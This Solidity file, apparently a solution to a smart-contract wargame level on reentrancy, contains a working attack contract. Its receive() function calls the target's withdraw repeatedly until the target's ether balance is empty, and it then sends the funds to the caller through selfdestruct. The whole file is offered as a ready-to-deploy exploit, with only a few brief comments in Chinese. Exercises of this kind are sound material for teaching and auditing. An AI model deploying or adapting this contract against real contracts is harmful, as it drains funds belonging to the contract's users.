// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    function attack() external payable {
        // 捐给自己
        target.donate{value: 1e18}(address(this));
        // donate
        target.withdraw(1e18);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    // 重入攻击
    receive() external payable {
        // 只能取出存入的钱(能取出的最大金额是 1e18, )
        uint amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
